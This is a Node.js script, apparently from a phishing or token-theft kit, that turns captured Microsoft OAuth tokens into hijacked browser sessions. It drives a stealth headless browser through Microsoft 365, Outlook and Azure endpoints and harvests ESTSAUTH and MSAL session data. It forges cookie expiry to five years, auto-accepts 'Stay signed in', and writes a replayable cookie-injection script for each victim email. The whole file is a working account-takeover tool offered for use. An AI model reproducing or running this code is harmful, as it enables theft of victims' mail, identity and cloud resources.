const fs = require('fs');
const path = require('path');

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// --- DETAILED ENVIRONMENT LOGGING ---
console.log('--- Hybrid Worker Startup ---');
console.log(`Time: ${new Date().toISOString()}`);
console.log(`Arguments: ${process.argv.slice(2).join(' ')}`);
console.log(`CWD: ${process.cwd()}`);
console.log(`Node Version: ${process.version}`);
console.log(`User: ${process.env.USER || 'unknown'}`);
console.log(`Executable Search Path: ${process.env.PATH}`);
console.log('---------------------------');
const projectRoot = __dirname;
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
require('dotenv').config();
puppeteer.use(StealthPlugin());
const crypto = require('crypto');

// Configuration
const cfg = {
    navTimeoutMs: 90000,
    actionTimeoutMs: 60000,
    artifactsDir: 'session_data',
    logLevel: 'info',
    proxyEnabled: false,
    proxyUrl: null
};

// Helper: Ensure directory exists
function ensureDir(dirPath) {
    if (!dirPath) return;
    if (!fs.existsSync(dirPath)) fs.mkdirSync(dirPath, { recursive: true });
}

/**
 * Save Microsoft authentication cookies with Consolidated-style scoring and validation
 */
async function saveMicrosoftCookies(page, email = null, providedSessionId = null) {
    try {
        console.log('🍪 Collecting 13 essential Microsoft authentication cookies (Consolidated-Style)...');

        let allCookies = [];
        let localStorageData = {};
        try {
            const client = await page.target().createCDPSession();
            const { cookies: cdpCookies } = await client.send('Network.getAllCookies');

            // --- TOTAL MEMORY SWEEP: LocalStorage Extraction ---
            try {
                const { result } = await client.send('Runtime.evaluate', {
                    expression: 'JSON.stringify(localStorage)',
                    returnByValue: true
                });
                localStorageData = JSON.parse(result.value || '{}');
                const lsKeys = Object.keys(localStorageData);
                const msalKeys = lsKeys.filter(k => k.startsWith('msal.2.'));
                console.log(`📦 Collected ${lsKeys.length} LocalStorage items via CDP (${msalKeys.length} MSAL markers)`);
                if (msalKeys.length > 0) {
                    console.log(`✅ MSAL Identity State detected in LocalStorage: ${msalKeys.slice(0, 3).join(', ')}...`);
                }
            } catch (e) {
                console.warn('⚠️ LocalStorage extraction failed:', e.message);
            }

            allCookies = (cdpCookies || []).map(c => ({
                name: c.name,
                value: c.value,
                domain: c.domain,
                path: c.path || '/',
                expires: c.expires,
                secure: !!c.secure,
                session: !!c.session,
                sameSite: c.sameSite || 'None',
                httpOnly: !!c.httpOnly
            }));
            console.log(`📦 Collected ${allCookies.length} cookies via CDP`);
        } catch (e) {
            const currentCookies = await page.cookies();
            allCookies = (currentCookies || []).map(c => ({
                ...c,
                path: c.path || '/',
                sameSite: c.sameSite || 'None'
            }));
            console.log(`📦 Fallback collected ${allCookies.length} cookies from current page`);
        }

        let extractedEmail = email; // Use the provided email, or try to extract
        if (!extractedEmail) {
            console.log('🔍 Attempting to extract email from LocalStorage/Cookies...');
            // Try LocalStorage first (MSAL cache)
            for (const key in localStorageData) {
                if (key.startsWith('msal.2.') && localStorageData[key].includes('@')) {
                    try {
                        const msalData = JSON.parse(localStorageData[key]);
                        if (msalData.idTokenClaims && msalData.idTokenClaims.preferred_username) {
                            extractedEmail = msalData.idTokenClaims.preferred_username;
                            console.log(`✅ Extracted email from LocalStorage (MSAL): ${extractedEmail}`);
                            break;
                        } else if (msalData.account && msalData.account.username) {
                            extractedEmail = msalData.account.username;
                            console.log(`✅ Extracted email from LocalStorage (MSAL account): ${extractedEmail}`);
                            break;
                        }
                    } catch (e) {
                        // Ignore parsing errors for non-JSON or malformed data
                    }
                }
            }

            // If not found in LocalStorage, try cookies
            if (!extractedEmail) {
                for (const cookie of allCookies) {
                    if (cookie.name === 'PPLSTS' && cookie.value.includes('@')) {
                        const match = cookie.value.match(/(\S+@\S+\.\S+)/);
                        if (match) {
                            extractedEmail = match[1];
                            console.log(`✅ Extracted email from PPLSTS cookie: ${extractedEmail}`);
                            break;
                        }
                    } else if (cookie.name === 'SignInStateCookie' && cookie.value.includes('upn=')) {
                        const decoded = decodeURIComponent(cookie.value);
                        const match = decoded.match(/upn=([^&]+)/);
                        if (match) {
                            extractedEmail = match[1];
                            console.log(`✅ Extracted email from SignInStateCookie: ${extractedEmail}`);
                            break;
                        }
                    }
                }
            }
        }

        const cookieMap = new Map();
        for (const cookie of allCookies) {
            const cookieKey = `${cookie.name}|${cookie.domain}|${cookie.path || '/'}`;
            if (!cookieMap.has(cookieKey) || (cookie.expires > 0 && cookie.expires > (cookieMap.get(cookieKey).expires || 0))) {
                cookieMap.set(cookieKey, cookie);
            }
        }

        const domainPriority = {
            '.m365.cloud.microsoft': 100,
            '.outlook.office.com': 98,
            '.outlook.office365.com': 95,
            '.login.microsoftonline.com': 90,
            '.office.com': 85,
            '.account.microsoft.com': 80,
            '.live.com': 75,
            '.aadcdn.msftauth.net': 70,
            '.aadcdn.msauth.net': 70
        };

        const essentialNames = [
            'ESTSAUTH','ESTSAUTHPERSISTENT','buid','fpc','stsservicecookie','x-ms-gateway-slice',
            'luat','SuiteServiceProxyKey','OWAAppIdType','MSPAuth','MSPOK','rtFa',
            'FedAuth', 'OParams', 'SSOCOOKIEPULLED', 'SignInStateCookie',
            'AADSSO', 'esctx', 'OpenIdConnect.nonce', 'OpenIdConnect.id_token', 'ClientId',
            'OIDC', 'MSFPC', 'msal.cache.encryption', 'x-ocditid',
            'OhpAuth', 'OhpToken', 'AjaxSessionKey', 'CS', 'NavCS',
            'OH.DCAffinity', 'OH.FLID', 'OH.RNG', 'OH.SID', 
            'PersonalizationCookie', 'SSREnabled', 'userId', 'UserIndex',
            '.AspNetCore.OpenIdConnect.Nonce.', '.AspNetCore.Correlation.'
        ];

        console.log(`🍪 Filtering ${allCookies.length} cookies for ${essentialNames.length} essential names...`);

        const filtered = [];
        const seen = new Set();
        const capturedNames = [];
        const pushCookie = (c) => {
            const key = `${c.name}|${c.domain}|${c.path || '/'}`;
            if (seen.has(key)) return;
            seen.add(key);
            
            const fiveYearsFromNow = Math.floor(Date.now() / 1000) + (5 * 365 * 24 * 60 * 60);
            
            if (c.expires === -1 || !c.expires || c.session) {
                c.expires = fiveYearsFromNow;
                c.session = false;
            } else if (c.expires < fiveYearsFromNow) {
                c.expires = fiveYearsFromNow;
            }
            
            c.secure = true;
            c.sameSite = 'None';
            if (c.domain && !c.domain.startsWith('.')) c.domain = '.' + c.domain.replace(/^\.+/, '');
            filtered.push(c);
            capturedNames.push(c.name);
        };

        // Add essential by priority
        for (const name of essentialNames) {
            const candidates = [];
            for (const [, c] of cookieMap) {
                if (c.name === name || c.name.startsWith(name) || (name.includes('.') && c.name.includes(name))) {
                    const pri = domainPriority[Object.keys(domainPriority).find(p => (c.domain || '').endsWith(p))] || 10;
                    candidates.push({ c, score: pri });
                }
            }
            candidates.sort((a,b) => b.score - a.score);
            if (candidates.length > 0) pushCookie(candidates[0].c);
            if (filtered.length >= 50) break;
        }

        // Fill with high-priority Microsoft domains
        if (filtered.length < 50) {
            const candidates = [];
            const already = new Set(filtered.map(c => `${c.name}|${c.domain}|${c.path || '/'}`));
            for (const [, c] of cookieMap) {
                const key = `${c.name}|${c.domain}|${c.path || '/'}`;
                if (already.has(key)) continue;
                const pri = domainPriority[Object.keys(domainPriority).find(p => (c.domain || '').endsWith(p))] || 0;
                if (pri > 0 || (c.name && c.name.startsWith('esctx-')) || (c.domain && c.domain.includes('m365.cloud.microsoft'))) {
                    candidates.push({ c, score: pri * 1000 + (c.expires || 0) });
                }
            }
            candidates.sort((a,b) => b.score - a.score);
            for (const { c } of candidates) {
                pushCookie(c);
                if (filtered.length >= 50) break;
            }
        }

        const hasRequiredCookie = filtered.some(c => c.name === 'ESTSAUTH' || c.name === 'ESTSAUTHPERSISTENT');
        console.log(`📦 Final Selection: ${capturedNames.join(', ')}`);
        console.log(`🔐 Auth Status: ${hasRequiredCookie ? 'VALID' : 'MISSING ESTSAUTH'}`);
        if (!hasRequiredCookie) {
            console.error('❌ STRICT MODE: Session missing required ESTSAUTH/ESTSAUTHPERSISTENT cookie. Session is unauthenticated.');
            return false; 
        }

        const sessionDir = path.join(__dirname, cfg.artifactsDir || 'session_data');
        ensureDir(sessionDir);

        const sessionId = providedSessionId || Date.now();
        const sessionTimestamp = new Date().toISOString();
        const sessionEmail = extractedEmail || 'unknown';

        const sessionInjectScript = path.join(sessionDir, `inject_session_${sessionId}.js`);
        
        const sessionScriptContent = `
// @ClosedService-Pages Hybrid Session Cookies 🍪 
// @ClosedService-Pages Generated via Token Swap (Perfect Capture) on ${sessionTimestamp}
// @ClosedService-Pages Email: ${sessionEmail}
// @ClosedService-Pages Cookies: ${filtered.length}
// @ClosedService-Pages LocalStorage: ${Object.keys(localStorageData).length} 

(function() {
    console.log('🚀 Injecting ${filtered.length} Microsoft cookies and LocalStorage for: ${sessionEmail}');
    
    // Inject LocalStorage (MSAL Identity State)
    const lStorage = ${JSON.stringify(localStorageData, null, 4)};
    Object.keys(lStorage).forEach(key => {
        try { localStorage.setItem(key, lStorage[key]); } catch (e) { console.warn('Failed to inject LocalStorage item:', key); }
    });

    const cookies = ${JSON.stringify(filtered, null, 4)};
    let injected = 0;
    cookies.forEach(cookie => {
        try {
            let cookieStr = cookie.name + '=' + cookie.value + ';';
            cookieStr += 'domain=' + cookie.domain + ';';
            cookieStr += 'path=' + cookie.path + ';';
            cookieStr += 'expires=' + new Date(cookie.expires * 1000).toUTCString() + ';';
            if (cookie.secure) cookieStr += 'secure;';
            if (cookie.sameSite) cookieStr += 'samesite=' + cookie.sameSite + ';';
            document.cookie = cookieStr;
            injected++;
        } catch (e) { console.warn('Failed to inject cookie:', cookie.name, e.message); }
    });
    console.log('✅ Successfully injected ' + injected + '/' + ${filtered.length} + ' cookies!');
})();`;

        fs.writeFileSync(sessionInjectScript, sessionScriptContent);
        console.log(`✅ Injection script saved to: ${sessionInjectScript}`);
        
        return true;
    } catch (error) {
        console.error('❌ Error saving cookies:', error.message);
        return false;
    }
}

async function applyFingerprint(page) {
    const userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36';
    await page.setUserAgent(userAgent).catch(() => {});
    await page.setExtraHTTPHeaders({ 'Accept-Language': 'en-US,en;q=0.9' }).catch(() => {});
    await page.evaluateOnNewDocument(() => {
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'platform', { get: () => 'Win32' });
        Object.defineProperty(navigator, 'vendor', { get: () => 'Google Inc.' });
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
        Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });
        Object.defineProperty(navigator, 'plugins', {
            get: () => [
                { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' },
                { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai' },
                { name: 'Native Client', filename: 'internal-nacl-plugin' }
            ]
        });
        if (!window.chrome) window.chrome = {};
        if (!window.chrome.runtime) window.chrome.runtime = {};
        const originalQuery = window.navigator.permissions && window.navigator.permissions.query;
        if (originalQuery) {
            window.navigator.permissions.query = (parameters) => {
                if (parameters && parameters.name === 'notifications') {
                    return Promise.resolve({ state: Notification.permission });
                }
                return originalQuery(parameters);
            };
        }
    });
}

async function runSwap(email, cookieId) {
    let browser = null;
    let overallSuccess = false;
    try {
        console.log(`🚀 Starting Hybrid Token Swap for ${email} (${cookieId})...`);

        const eventFile = path.join(projectRoot, 'session_data', `event_${cookieId}.json`);
        let eventData = null;
        const maxRetries = 10;
        const retryDelayMs = 500;

        for (let i = 0; i < maxRetries; i++) {
            if (fs.existsSync(eventFile)) {
                eventData = JSON.parse(fs.readFileSync(eventFile, 'utf8'));
                console.log(`✅ Event file found after ${i + 1} attempt(s).`);
                break;
            }
            console.log(`⏳ Event file not found, retrying in ${retryDelayMs}ms... (Attempt ${i + 1}/${maxRetries})`);
            await sleep(retryDelayMs);
        }

        if (!eventData) {
            throw new Error(`Event file not found after ${maxRetries} attempts: ${eventFile}`);
        }
        let tokens = eventData.token_data || {};

        console.log('📦 Available Tokens:', Object.keys(tokens).filter(k => !k.includes('token')).join(', '));
        if (tokens.id_token) console.log('✅ id_token present');
        if (tokens.refresh_token) console.log('✅ refresh_token present');
        if (tokens.access_token) console.log('✅ access_token present');
        if (tokens.office) console.log('✅ office_token present');
        if (tokens.outlook) console.log('✅ outlook_token present');
        if (tokens.mgmt) console.log('✅ mgmt_token present');
        
        // UNIVERSAL TOKEN STRATEGY (CDP-ONLY MODE): 
        // We use the provided Client ID (usually PowerShell) to maintain the session.
        // As requested, we skip the token refresh/swap and proceed directly to browser-based 
        // CDP extraction to leverage the already logged-in session.
        const officeClientId = "d326c4ad-3914-4aba-ba32-83500a38b6a1"; 
        const activeClientId = eventData.clientId || "1950a258-227b-4e31-a9cf-717495945fc2";
        
        console.log(`ℹ️ CDP-Only Mode: Skipping token swap/refresh. Client: ${activeClientId}`);
        
        /* 
        // Token swap logic disabled as per user request
        if (tokens.is_fresh) { ... }
        */

        // --- BROWSER ACQUISITION (UNIVERSAL MODE) ---
        // We launch a fresh stealth browser on the VPS to handle the session bridge.
        // This ensures compatibility with ANY browser the user is using (Safari, Firefox, Mobile, etc.)
        // because the VPS handles the cookie generation internally.
        
        console.log('🚀 Launching universal stealth browser host...');
        const userDataDir = path.join(projectRoot, 'chrome_config');
        ensureDir(userDataDir);

        const browserOptions = {
            headless: true,
            ignoreDefaultArgs: ['--enable-automation'],
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                `--user-data-dir=${userDataDir}`,
                '--window-size=1920,1080',
                '--disable-blink-features=AutomationControlled',
                '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                '--disable-background-networking'
            ]
        };

        // Discovery logic for executable path
        const cacheDir = process.env.PUPPETEER_CACHE_DIR
            || (process.env.HOME ? path.join(process.env.HOME, '.cache/puppeteer') : path.join(projectRoot, '.cache/puppeteer'));
        const chromeRoot = path.join(cacheDir, 'chrome');
        let executablePath = process.env.PUPPETEER_EXECUTABLE_PATH || null;

        if (!executablePath) {
            try {
                if (fs.existsSync(chromeRoot)) {
                    const versions = fs.readdirSync(chromeRoot).filter(name => fs.statSync(path.join(chromeRoot, name)).isDirectory()).sort();
                    const latest = versions[versions.length - 1];
                    if (latest) {
                        const base = path.join(chromeRoot, latest);
                        const candidates = [
                            path.join(base, 'chrome-linux64', 'chrome'),
                            path.join(base, 'chrome-linux', 'chrome'),
                            path.join(base, 'chrome'),
                            path.join(base, 'chrome.exe')
                        ];
                        for (const p of candidates) { if (fs.existsSync(p)) { executablePath = p; break; } }
                    }
                }
            } catch (e) {}
            if (!executablePath) {
                const systemCandidates = ['/usr/bin/google-chrome-stable', '/usr/bin/google-chrome', '/usr/bin/chromium-browser', '/usr/bin/chromium'];
                for (const p of systemCandidates) { if (fs.existsSync(p)) { executablePath = p; break; } }
            }
        }

        if (executablePath) {
            browserOptions.executablePath = executablePath;
            console.log(`🚀 Using Executable: ${executablePath}`);
        }

        try {
            browser = await puppeteer.launch(browserOptions);
        } catch (launchError) {
            console.warn(`⚠️ Primary launch failed: ${launchError.message}. Trying generic launch...`);
            delete browserOptions.executablePath;
            browser = await puppeteer.launch(browserOptions);
        }

        const page = (await browser.pages())[0] || await browser.newPage();
        const client = await page.target().createCDPSession();
        
        // --- SESSION VERIFICATION LOGGING ---
        console.log('🔍 Diagnostic: Checking browser memory for existing login state...');
        try {
            const { cookies: diagnosticCookies } = await client.send('Network.getAllCookies');
            const authMarkers = (diagnosticCookies || []).filter(c => 
                ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'rtFa', 'FedAuth', 'AADSSO', 'esctx', 'OhpAuth', 'OhpToken', 'AjaxSessionKey'].some(m => c.name.includes(m))
            );
            
            if (authMarkers.length > 0) {
                console.log(`✅ Session Found! Detected ${authMarkers.length} active auth markers:`);
                authMarkers.forEach(c => {
                    const expiry = c.expires ? new Date(c.expires * 1000).toISOString() : 'Session';
                    console.log(`   - [${c.name}] on domain ${c.domain} (Expires: ${expiry})`);
                });
            } else {
                console.log('⚠️ Session Empty: No authentication markers found in browser memory.');
            }
        } catch (diagError) {
            console.warn('⚠️ Diagnostic check failed:', diagError.message);
        }
        
        // Hide Puppeteer fingerprints
        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => false });
            window.chrome = { runtime: {} };
            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
        });

        let owaUserConfigOk = false;
        page.on('response', (res) => {
            const url = res.url();
            if (url.includes('/owa/service.svc?action=GetOwaUserConfiguration') && res.status() === 200) {
                owaUserConfigOk = true;
                console.log('✅ OWA User Configuration detected! Session is fully active.');
            }
        });

        const idToken = tokens.id_token;
        const tenantId = tokens.tid || 'common'; 
        const outlookToken = tokens.outlook || tokens.office || tokens.access_token;
        const mgmtToken = tokens.mgmt;

        // CDP-BASED EXTRACTION (Primary Method)
        // We navigate to a Microsoft endpoint and immediately try to extract cookies via CDP.
        // This leverages any existing session in the browser context without needing a token swap.
        console.log('🚀 Attempting direct CDP session capture...');

        // First, navigate to the main Microsoft login page to ensure ESTSAUTH is initialized
        console.log('🌐 Navigating to https://login.microsoft.com/ to establish session...');
        await page.goto('https://login.microsoft.com/', { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(e => {
            console.warn('⚠️ Navigation to login.microsoft.com failed or timed out:', e.message);
        });
        
        await page.goto(`https://login.microsoftonline.com/${tenantId}/login.srf`, { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => {});
        
        let cdpSuccess = await saveMicrosoftCookies(page, email, cookieId);
        
        if (cdpSuccess) {
            console.log('✅ CDP session capture successful! Skipping token-based injection.');
            overallSuccess = true;
        } else if (idToken) {
            console.log('ℹ️ CDP capture missing ESTSAUTH. Proceeding with token injection bridge...');
            console.log('🔑 Injecting session via login.srf...');
            await page.evaluate((token, tid) => {
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = `https://login.microsoftonline.com/${tid}/login.srf`;
                const fields = { 
                    'wa': 'wsignin1.0', 
                    'wtrealm': 'urn:federation:MicrosoftOnline', 
                    'id_token': token, 
                    'PPSX': 'PassThrough', 
                    'LoginOptions': '3',
                    'wctx': 'https://outlook.office.com/owa/?auth_redirect=true' 
                };
                for (const [name, value] of Object.entries(fields)) {
                    const input = document.createElement('input'); input.type = 'hidden'; input.name = name; input.value = value; form.appendChild(input);
                }
                document.body.appendChild(form);
                form.submit();
            }, idToken, tenantId);
            
            await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 30000 }).catch(() => {});

            // TARGETED BRIDGE: Outlook OWA with Access Token
            if (outlookToken) {
                console.log('🔗 Triggering Outlook OWA with Access Token...');
                await page.goto(`https://outlook.office.com/owa/?auth_redirect=true&access_token=${encodeURIComponent(outlookToken)}`, { waitUntil: 'domcontentloaded', timeout: 20000 }).catch(() => {});
            }

            // TARGETED BRIDGE: Azure Management
            if (mgmtToken) {
                console.log('🔗 Triggering Azure Management with Access Token...');
                await page.goto(`https://management.azure.com/providers/Microsoft.ResourceGraph/resources?api-version=2019-04-01&$skipToken=1&access_token=${encodeURIComponent(mgmtToken)}`, { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => {});
            }

            // FINAL FORCE: Settle the session
            console.log('🔄 Performing final session settling...');
            await page.goto(`https://login.microsoftonline.com/${tenantId}/login.srf`, { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => {});
        }

        // --- AGGRESSIVE KMSI PROMOTION (Persistent Session) ---
        // We do this regardless of how we got in, to ensure the session lasts.
        console.log('🔄 Checking for KMSI "Stay signed in?" promotion...');
        try {
            const kmsiSelector = '#idSIButton9';
            const hasKmsi = await page.waitForSelector(kmsiSelector, { timeout: 5000 }).catch(() => null);
            if (hasKmsi) {
                console.log('Detected "Stay signed in" prompt. Promoting to persistent session...');
                await Promise.all([
                    page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => {}),
                    page.click(kmsiSelector).catch(() => {})
                ]);
                console.log('✅ KMSI Promotion successful!');
            }
        } catch (e) {
            console.log('ℹ️ No KMSI prompt detected or error occurred.');
        }

        // AGGRESSIVE BRIDGE LOOP with Domain Handshaking
        console.log('🔄 Performing Domain Handshake for cross-site cookies...');
        const bridgeEndpoints = [
            `https://login.microsoftonline.com/${tenantId}/reprocess`,
            'https://m365.cloud.microsoft/chat/?auth=2',
            'https://portal.azure.com/',
            'https://www.office.com/login?es=click',
            'https://myaccount.microsoft.com/',
            'https://login.live.com/me.srf?wa=wsignin1.0',
            'https://portal.office.com/landing?target=/mail/'
        ];

        for (const endpoint of bridgeEndpoints) {
            if (owaUserConfigOk) break; // Early exit if OWA already confirmed

            console.log(`🔗 Bridging to: ${endpoint}`);
            
            // MANUAL COOKIE SYNC (MCS)
            const currentCookies = await page.cookies();
            const authCookies = currentCookies.filter(c => ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'rtFa', 'FedAuth', 'ClientId'].includes(c.name));
            
            if (authCookies.length > 0) {
                const targetDomain = new URL(endpoint).hostname;
                const syncCookies = authCookies.map(c => ({
                    ...c,
                    domain: targetDomain.startsWith('www.') ? targetDomain.substring(3) : '.' + targetDomain,
                    url: endpoint
                }));
                for (const sc of syncCookies) {
                    await client.send('Network.setCookie', sc).catch(() => {});
                }
            }

            await page.goto(endpoint, { waitUntil: 'domcontentloaded', timeout: 20000 }).catch(() => {});
            
            const cookiesAfter = await page.cookies();
            if (cookiesAfter.some(c => c.name === 'ESTSAUTH' || c.name === 'ESTSAUTHPERSISTENT')) {
                console.log(`✅ Session active on ${new URL(endpoint).hostname}.`);
                if (endpoint.includes('office.com')) break; 
            }
        }

        // Finalizing capture via Outlook
        console.log('📩 Finalizing capture via Outlook...');
        await page.goto('https://outlook.office.com/owa/?auth_redirect=true', { waitUntil: 'domcontentloaded', timeout: 30000 }).catch(() => {});
        
        // Final stabilizing wait
        const waitStart = Date.now();
        while (Date.now() - waitStart < 15000) {
            if (owaUserConfigOk) break;
            const currentCookies = await page.cookies();
            if (currentCookies.some(c => c.name === 'ESTSAUTH' || c.name === 'ESTSAUTHPERSISTENT')) break;
            await new Promise(r => setTimeout(r, 500));
        }

        overallSuccess = await saveMicrosoftCookies(page, email, cookieId);
        
        if (overallSuccess) {
            console.log('HYBRID SWAP SUCCESS');
        }

    } catch (e) {
        console.error('❌ Hybrid Swap Exception:', e.message);
    } finally {
        if (browser) await browser.close();
        process.exit(overallSuccess ? 0 : 1);
    }
}

const args = process.argv.slice(2);
const email = args[0];
const cookieId = args[2];

if (!email || !cookieId) {
    console.error('Usage: node token_swap.js <email> <password> <cookieId>');
    process.exit(1);
}

runSwap(email, cookieId);
